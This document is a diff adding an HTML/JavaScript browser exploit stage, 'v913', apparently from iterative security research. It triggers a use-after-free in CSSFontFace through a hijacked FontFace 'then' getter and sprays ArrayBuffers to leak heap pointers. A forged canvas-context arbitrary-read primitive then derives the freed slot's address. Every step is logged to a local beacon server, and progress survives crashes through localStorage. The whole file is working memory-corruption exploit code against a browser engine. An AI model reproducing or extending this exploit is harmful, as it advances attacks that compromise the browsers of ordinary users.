@@ -1,0 +1,229 @@
+<!--
+  v913: FontFace pair leak (corrected p563 form) + cycle-closure discriminator
+  → directed self-address, without any blind sweep.
+
+  Chain (cobrajet302gt, PR #212 audit item 4 + comment 6684384814):
+    1. Corrected p563 trigger: the then-getter frees the CSSFontFace; 13 size
+       classes of ArrayBuffer race the slot; engine writes are read back
+       bit-exact through Uint8Array (no FPU, no DAZ hazard). Scan rounds do
+       NOT latch `done` until a HIT is seen (the original p563 latched at
+       entry and never rescanned at 400ms — retracted as a scan artifact).
+    2. The pair: +0x58 (clients-table cell) and +0x68 (wrapper's
+       DefaultWeakPtrImpl, W). Persisted to localStorage on hit.
+    3. Discriminator: candidates F ∈ {*(W+0x20), *(W+0x30)}; accept F iff
+       masked(*(F+0x68)) (shift branch: F+0x78) equals the stored W. The
+       accepted F is the reclaimed slot's VA — carrier self-address modulo
+       the allocator's chunk header. Reads go through the v911 forge
+       (forged stateStack, read at T+0x30 as f64).
+    DAZ note: if the fork-model values are untagged, pointer-valued forge
+    reads return 0.0 (denormals-are-zero). Every step beacons PRE/POST so a
+    desk-side re-grade survives; the pair itself never passes through f64.
+
+  Every beacon is a synchronous XHR so it leaves the renderer before a
+  possible crash in the same call. Crashes resume from localStorage:
+  the pair survives, the discriminator step is re-run.
+
+  Run: python tools/browser_runner/serve.py --default v913_fontface_pair_disc.html
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>v913 pair + discriminator</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var SIZES = [64, 96, 128, 160, 192, 224, 256, 320, 384, 512, 768, 1024, 2048];
+var K = 8, styleEl = null, firedHere = false, done = false;
+var TRIALS_MAX = 40;
+
+/* ---- bit-exact helpers (Uint8Array only — no float64 on leaked values) ---- */
+function u64le(v, off){
+  return ('00000000' + ((v[off+4] | (v[off+5]<<8) | (v[off+6]<<16) | (v[off+7]<<24))>>>0).toString(16)).slice(-8) +
+         ('00000000' + ((v[off] | (v[off+1]<<8) | (v[off+2]<<16) | (v[off+3]<<24))>>>0).toString(16)).slice(-8);
+}
+function hexf64(v){var b8=new ArrayBuffer(8),fa=new Float64Array(b8),u=new Uint32Array(b8);fa[0]=v;return '0x'+('00000000'+u[1].toString(16)).slice(-8)+('00000000'+u[0].toString(16)).slice(-8);}
+function hiOf(h){return parseInt(h.slice(0,8),16);}
+function loOf(h){return parseInt(h.slice(8,16),16);}
+
+/* ---- v911 forge primitives (verbatim mechanism, 14.22-proven) ---- */
+function uafCycle(){
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function(){
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+  if (!innerCtx) return null;
+  for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
+  var dvs = [];
+  for (var s = 0; s < 150; s++) {
+    var ab = new ArrayBuffer(768);
+    dvs.push(new DataView(ab));
+  }
+  return { inner: innerCtx, dvs: dvs };
+}
+/* forge read: m_buffer=T/116, cap@120, size@124; lineWidth reads *(T+0x30) as f64.
+   To read address A: T = A - 0x30. Returns the f64 bit pattern (may be DAZ-zeroed). */
+function forgeRead(cycle, aHi, aLo){
+  for (var w = 0; w < cycle.dvs.length; w++) {
+    var dv = cycle.dvs[w];
+    dv.setUint32(112, aLo, true);
+    dv.setUint32(116, aHi, true);
+    dv.setUint32(120, 1, true);
+    dv.setUint32(124, 1, true);
+  }
+  var leaked = cycle.inner.lineWidth;
+  cycle.inner = null;
+  for (var c = 0; c < cycle.dvs.length; c++) {
+    cycle.dvs[c].setFloat64(112, 0, true);
+    cycle.dvs[c].setUint32(120, 0, true);
+    cycle.dvs[c].setUint32(124, 0, true);
+  }
+  return leaked;
+}
+
+/* ---- stage 1: corrected p563 pair oracle ---- */
+function setup(){
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__map = [];
+      for (var si = 0; si < SIZES.length; si++) {
+        var size = SIZES[si];
+        for (var k = 0; k < K; k++) {
+          var ab = new ArrayBuffer(size);
+          window.__map.push({ size: size, view: new Uint8Array(ab) });
+        }
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('V913-LOAD-CALLED');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('V913-RESOLVED'); }, function(){ b('V913-REJECTED'); });
+  /* corrected form: rounds, no premature latch */
+  var rounds = [60, 300, 700, 1500, 3000, 5000];
+  for (var r = 0; r < rounds.length; r++) (function(t){ setTimeout(function(){ scan(t); }, t); })(rounds[r]);
+  setTimeout(function(){ if (!done) nextTrial('noscan-fired-' + (firedHere ? 1 : 0)); }, 8000);
+}
+function scan(round){
+  if (done) return;
+  var m = window.__map; if (!m || !m.length) return;
+  var hits = [];
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0, first = -1;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) { n++; if (first < 0) first = j; }
+    if (n) hits.push({ i: i, first: first, n: n });
+  }
+  if (!hits.length) return;      /* corrected: no latch on clean rounds */
+  done = true;
+  var pair = null;
+  for (var h = 0; h < hits.length; h++) {
+    var idx = hits[h].i, v = m[idx].view;
+    var dump = 'b' + idx + '-s' + m[idx].size + '-o' + hits[h].first + '-n' + hits[h].n;
+    if (v.length >= 0x70) {
+      dump += '|r@0=' + u64le(v, 0) + '|p58=' + u64le(v, 0x58) + '|p68=' + u64le(v, 0x68);
+      var p68 = u64le(v, 0x68);
+      if (!pair && parseInt(p68.slice(0,8),16) !== 0 && parseInt(p68.slice(8,16),16) !== 0) {
+        pair = { buf: idx, size: m[idx].size, p58: u64le(v, 0x58), p68: p68 };
+      }
+    }
+    b('V913-HIT-r' + round + '-' + dump);
+  }
+  if (!pair) { b('V913-HITS-NOPAIR'); nextTrial('hits-nopair'); return; }
+  try { localStorage.setItem('v913_pair', JSON.stringify(pair)); localStorage.setItem('v913_step', 'disc'); } catch(e) {}
+  b('V913-PAIR|buf=' + pair.buf + '|s' + pair.size + '|p58=0x' + pair.p58 + '|p68=0x' + pair.p68);
+  setTimeout(discriminate, 250);
+}
+
+/* ---- stage 2: discriminator (crash-resumable from stored pair) ---- */
+function maskedLo(h, bits){ var lo = loOf(h) & ~((1<<bits)-1); return '0x' + ('00000000'+hiOf(h).toString(16)).slice(-8) + ('00000000'+(lo>>>0).toString(16)).slice(-8); }
+function discriminate(){
+  var pair;
+  try { pair = JSON.parse(localStorage.getItem('v913_pair')); } catch(e) {}
+  if (!pair) { nextTrial('disc-nopair'); return; }
+  var W = maskedLo(pair.p68, 3);
+  b('V913-DISC-START|W=' + W);
+  var cands = [];
+  /* read *(W+0x20): forge T = W+0x20-0x30 = W-0x10 ; read *(W+0x30): T = W */
+  var steps = [
+    { tag: 'c1', addr: '0x' + hiLoAdd(pair.p68, -0x10), desc: '*(W+0x20)' },
+    { tag: 'c2', addr: '0x' + pair.p68, desc: '*(W+0x30)' }
+  ];
+  for (var s = 0; s < steps.length; s++) {
+    var st = steps[s];
+    try { localStorage.setItem('v913_step', 'disc-' + st.tag); } catch(e) {}
+    b('V913-READ-PRE|' + st.tag + '|' + st.desc + '|T=' + st.addr);
+    var cy = uafCycle();
+    if (!cy) { b('V913-READ-NOUAF|' + st.tag); return; }
+    var val = forgeRead(cy, hiOf(st.addr), loOf(st.addr));
+    b('V913-READ|' + st.tag + '=' + hexf64(val) + '|' + st.desc);
+    if (val !== 0) cands.push(hexf64(val));
+  }
+  if (!cands.length) { b('V913-DISC-FAIL|all-candidates-DAZ-zero-or-null'); return; }
+  /* verify: accept F iff masked(*(F+0x68)) == stored W (shift branch: F+0x78) */
+  for (var ci = 0; ci < cands.length; ci++) {
+    var F = maskedLo(cands[ci], 3);
+    var vs = [
+      { tag: 'v68', off: 0x68 - 0x30 },
+      { tag: 'v78', off: 0x78 - 0x30 }
+    ];
+    for (var vi = 0; vi < vs.length; vi++) {
+      var vv = vs[vi];
+      try { localStorage.setItem('v913_step', 'verify-' + vv.tag + '-' + ci); } catch(e) {}
+      var T = '0x' + hiLoAdd(F, vv.off);
+      b('V913-VERIFY-PRE|F=' + F + '|' + vv.tag + '|T=' + T);
+      var cy2 = uafCycle();
+      if (!cy2) { b('V913-VERIFY-NOUAF'); return; }
+      var rv = forgeRead(cy2, hiOf(T), loOf(T));
+      var rvh = hexf64(rv);
+      b('V913-VERIFY|F=' + F + '|' + vv.tag + '=' + rvh + '|want~' + W);
+      var hit = (maskedLo(rvh, 3) === W) || (maskedLo(rvh, 12) === W);
+      if (hit) {
+        try { localStorage.setItem('v913_hit', 'F=' + F + '|' + vv.tag); } catch(e) {}
+        b('V913-SLOT-VA|F=' + F + '|branch=' + vv.tag + '|carrier=buf' + pair.buf + '-s' + pair.size);
+        b('V913-DONE|SELF-ADDR-DERIVED');
+        return;
+      }
+    }
+  }
+  b('V913-DISC-FAIL|no-candidate-closed-the-cycle');
+}
+function hiLoAdd(h, d){ var lo = (loOf(h) + d)>>>0, hi = hiOf(h); if (d>=0 && lo < loOf(h)) hi++; if (d<0 && lo > loOf(h)) hi--; return ('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8); }
+
+function nextTrial(reason){
+  var t = 0;
+  try { t = parseInt(localStorage.getItem('v913_trial')) || 0; localStorage.setItem('v913_trial', String(t + 1)); } catch(e) {}
+  b('V913-TRIAL-END|t=' + t + '|' + reason);
+  if (t >= TRIALS_MAX) { b('V913-EXHAUSTED|' + t + '-trials'); return; }
+  setTimeout(function(){ location.reload(); }, 1200);
+}
+
+function boot(){
+  var st = null;
+  try { st = localStorage.getItem('v913_step'); } catch(e) {}
+  if (st === 'disc') { b('V913-RESUME-DISC'); discriminate(); return; }
+  var t = 0;
+  try { t = parseInt(localStorage.getItem('v913_trial')) || 0; } catch(e) {}
+  b('V913-BOOT|trial=' + t);
+  setup();
+}
+if (location.search.indexOf('r=1') >= 0) {
+  try { localStorage.removeItem('v913_pair'); localStorage.removeItem('v913_step'); localStorage.removeItem('v913_trial'); localStorage.removeItem('v913_hit'); } catch(e) {}
+}
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(boot, 0);
+else document.addEventListener('DOMContentLoaded', boot);
+</script></head><body><p>v913 pair + discriminator</p></body></html>
